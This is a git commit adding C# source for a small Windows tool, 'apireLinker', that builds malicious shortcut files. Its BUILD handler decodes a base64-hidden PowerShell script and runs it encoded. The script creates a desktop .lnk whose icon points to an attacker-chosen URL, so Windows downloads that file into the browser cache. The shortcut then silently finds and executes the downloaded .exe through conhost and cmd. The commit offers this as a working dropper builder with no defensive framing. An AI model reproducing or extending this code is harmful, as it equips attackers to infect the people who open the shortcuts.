283dd8ac08b3cbd41642c2db28e083f62e19463f
realapire <duboisandre092@gmail.com>
2022-09-11 05:57:29 +0200

    linker

---
+++ apireLinker/Form1.Designer.cs
@@ -0,0 +1,123 @@
+﻿namespace apireLinker
+{
+    partial class mainForm
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(mainForm));
+            this.textBoxLink = new System.Windows.Forms.TextBox();
+            this.buttonBuild = new System.Windows.Forms.Button();
+            this.groupBoxLink = new System.Windows.Forms.GroupBox();
+            this.groupBoxFile = new System.Windows.Forms.GroupBox();
+            this.textBoxFile = new System.Windows.Forms.TextBox();
+            this.groupBoxLink.SuspendLayout();
+            this.groupBoxFile.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // textBoxLink
+            // 
+            this.textBoxLink.Dock = System.Windows.Forms.DockStyle.Bottom;
+            this.textBoxLink.Location = new System.Drawing.Point(3, 26);
+            this.textBoxLink.Name = "textBoxLink";
+            this.textBoxLink.Size = new System.Drawing.Size(375, 20);
+            this.textBoxLink.TabIndex = 0;
+            // 
+            // buttonBuild
+            // 
+            this.buttonBuild.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
+            this.buttonBuild.Dock = System.Windows.Forms.DockStyle.Bottom;
+            this.buttonBuild.Location = new System.Drawing.Point(0, 153);
+            this.buttonBuild.Name = "buttonBuild";
+            this.buttonBuild.Size = new System.Drawing.Size(405, 50);
+            this.buttonBuild.TabIndex = 2;
+            this.buttonBuild.Text = "BUILD";
+            this.buttonBuild.UseVisualStyleBackColor = true;
+            this.buttonBuild.Click += new System.EventHandler(this.buttonBuild_Click);
+            // 
+            // groupBoxLink
+            // 
+            this.groupBoxLink.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.groupBoxLink.Controls.Add(this.textBoxLink);
+            this.groupBoxLink.Location = new System.Drawing.Point(12, 10);
+            this.groupBoxLink.Name = "groupBoxLink";
+            this.groupBoxLink.Size = new System.Drawing.Size(381, 49);
+            this.groupBoxLink.TabIndex = 5;
+            this.groupBoxLink.TabStop = false;
+            this.groupBoxLink.Text = "Link - URL";
+            // 
+            // groupBoxFile
+            // 
+            this.groupBoxFile.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right)));
+            this.groupBoxFile.Controls.Add(this.textBoxFile);
+            this.groupBoxFile.Location = new System.Drawing.Point(12, 85);
+            this.groupBoxFile.Name = "groupBoxFile";
+            this.groupBoxFile.Size = new System.Drawing.Size(381, 49);
+            this.groupBoxFile.TabIndex = 6;
+            this.groupBoxFile.TabStop = false;
+            this.groupBoxFile.Text = "File - Filename";
+            // 
+            // textBoxFile
+            // 
+            this.textBoxFile.Dock = System.Windows.Forms.DockStyle.Bottom;
+            this.textBoxFile.Location = new System.Drawing.Point(3, 26);
+            this.textBoxFile.Name = "textBoxFile";
+            this.textBoxFile.Size = new System.Drawing.Size(375, 20);
+            this.textBoxFile.TabIndex = 0;
+            // 
+            // mainForm
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(405, 203);
+            this.Controls.Add(this.groupBoxFile);
+            this.Controls.Add(this.groupBoxLink);
+            this.Controls.Add(this.buttonBuild);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.Name = "mainForm";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "linker";
+            this.groupBoxLink.ResumeLayout(false);
+            this.groupBoxLink.PerformLayout();
+            this.groupBoxFile.ResumeLayout(false);
+            this.groupBoxFile.PerformLayout();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.TextBox textBoxLink;
+        private System.Windows.Forms.Button buttonBuild;
+        private System.Windows.Forms.GroupBox groupBoxLink;
+        private System.Windows.Forms.GroupBox groupBoxFile;
+        private System.Windows.Forms.TextBox textBoxFile;
+    }
+}
+
---
+++ apireLinker/Form1.cs
@@ -0,0 +1,32 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace apireLinker
+{
+    public partial class mainForm : Form
+    {
+        public mainForm()
+        {
+            InitializeComponent();
+        }
+
+        private void buttonBuild_Click(object sender, EventArgs e)
+        {
+            string builder = Encoding.Default.GetString(Convert.FromBase64String("JHNoZWxsID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IFdTY3JpcHQuU2hlbGw7JGRlc2t0b3AgPSBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnRGVza3RvcCcpOyRzaG9ydGN1dCA9ICRzaGVsbC5DcmVhdGVTaG9ydGN1dCgiJGRlc2t0b3BcJWZpbGVuYW1lJS5sbmsiKTskc2hvcnRjdXQuVGFyZ2V0UGF0aCA9ICJDOlx3aW5kb3dzXHN5c3RlbTMyXGNvbmhvc3QuZXhlIjskc2hvcnRjdXQuV2luZG93U3R5bGUgPSA3OyRzaG9ydGN1dC5Bcmd1bWVudHMgPSAnY21kLmV4ZSAvYyBjZCAlVVNFUlBST0ZJTEUlXEFwcERhdGFcTG9jYWxcTWljcm9zb2Z0XFdpbmRvd3NcSU5ldENhY2hlICYgZGlyIC9zIC9CICVmaWxlbmFtZSUqLmV4ZSB8IGNtZC5leGUgL2snOyRzaG9ydGN1dC5JY29uTG9jYXRpb24gPSAiJWxuayU/LmljbyI7JHNob3J0Y3V0LlNhdmUoKTs="));
+            string lnk = textBoxLink.Text;
+            string filename = textBoxFile.Text;
+            builder = builder.Replace("%lnk%", lnk).Replace("%filename%", filename);
+            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(builder));
+            Process.Start("Powershell.exe", "-enc " + b64);
+            MessageBox.Show("The file is saved on your desktop.", "Confirmation", MessageBoxButtons.OK, MessageBoxIcon.Information);
+        }
+    }
+}
